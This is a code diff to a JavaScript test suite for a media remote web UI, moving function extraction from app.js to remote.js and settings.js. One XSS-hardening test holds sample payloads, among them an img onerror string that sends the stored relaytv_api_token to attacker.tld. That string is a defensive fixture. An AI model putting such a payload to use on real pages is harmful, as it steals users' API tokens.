@@ -7,7 +7,8 @@ const path = require('node:path');
 const vm = require('node:vm');
 
 const UI_DIR = path.join(__dirname, '../../app/relaytv_app/static/ui');
-const APP_JS = fs.readFileSync(path.join(UI_DIR, 'app.js'), 'utf8');
+const REMOTE_JS = fs.readFileSync(path.join(UI_DIR, 'remote.js'), 'utf8');
+const SETTINGS_JS = fs.readFileSync(path.join(UI_DIR, 'settings.js'), 'utf8');
 const JELLYFIN_JS = fs.readFileSync(path.join(UI_DIR, 'jellyfin.js'), 'utf8');
 const PLEX_JS = fs.readFileSync(path.join(UI_DIR, 'plex.js'), 'utf8');
 const APP_CSS = fs.readFileSync(path.join(UI_DIR, 'app.css'), 'utf8');
@@ -204,8 +205,8 @@ test('audio and subtitle track pickers render untrusted metadata as inert text w
     refresh: async () => {},
   });
 
-  vm.runInContext(extractFunction(APP_JS, '_renderNowLanguageOptions'), context);
-  vm.runInContext(extractFunction(APP_JS, '_renderNowSubtitleOptions'), context);
+  vm.runInContext(extractFunction(REMOTE_JS, '_renderNowLanguageOptions'), context);
+  vm.runInContext(extractFunction(REMOTE_JS, '_renderNowSubtitleOptions'), context);
 
   const xssDisplay = '<img src=x onerror="fetch(\'https://attacker.tld/?t=\'+localStorage.getItem(\'relaytv_api_token\'))">';
   const xssLang = '<script>alert(1)</script>';
@@ -277,8 +278,8 @@ test('CSS backgroundImage helpers strip quote and parenthesis breakout character
       createElement: (tag) => createFakeElement(tag),
     },
   });
-  vm.runInContext(extractFunction(APP_JS, '_safeCssUrlValue'), context);
-  vm.runInContext(extractFunction(APP_JS, 'setBg'), context);
+  vm.runInContext(extractFunction(REMOTE_JS, '_safeCssUrlValue'), context);
+  vm.runInContext(extractFunction(REMOTE_JS, 'setBg'), context);
   vm.runInContext(extractFunction(PLEX_JS, '_plexRenderDetail'), context);
 
   const heroEl = createFakeElement('div');
@@ -342,12 +343,12 @@ test('_applyUiJellyfinEvent skips loadSettingsUi when Settings has unsaved edits
   });
 
   vm.runInContext('var __settingsDirty = false;', context);
-  vm.runInContext(extractFunction(APP_JS, '_isSettingsControlFocused'), context);
-  vm.runInContext(extractFunction(APP_JS, '_applyUiJellyfinEvent'), context);
-  vm.runInContext(extractFunction(APP_JS, 'openSettings'), context);
-  vm.runInContext(extractFunction(APP_JS, 'closeSettings'), context);
-  vm.runInContext(extractFunction(APP_JS, '_selectSettingsTab'), context);
-  vm.runInContext(extractFunction(APP_JS, 'bindSettingsUi'), context);
+  vm.runInContext(extractFunction(REMOTE_JS, '_isSettingsControlFocused'), context);
+  vm.runInContext(extractFunction(REMOTE_JS, '_applyUiJellyfinEvent'), context);
+  vm.runInContext(extractFunction(SETTINGS_JS, 'openSettings'), context);
+  vm.runInContext(extractFunction(SETTINGS_JS, 'closeSettings'), context);
+  vm.runInContext(extractFunction(SETTINGS_JS, '_selectSettingsTab'), context);
+  vm.runInContext(extractFunction(SETTINGS_JS, 'bindSettingsUi'), context);
   context.bindSettingsUi();
 
   // 1. Open settings cleanly (starts hidden)
